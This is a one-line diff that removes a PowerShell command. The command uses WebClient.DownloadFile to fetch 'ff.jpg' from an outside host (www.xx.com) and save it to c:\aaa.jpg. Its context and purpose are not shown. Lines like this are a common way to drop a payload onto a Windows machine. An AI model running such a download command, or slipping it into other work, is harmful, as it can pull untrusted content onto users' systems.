@@ -1,1 +1,0 @@
-powershell (new-object System.Net.WebClient).DownloadFile( 'http://www.xx.com/ff.jpg','c:\aaa.jpg')
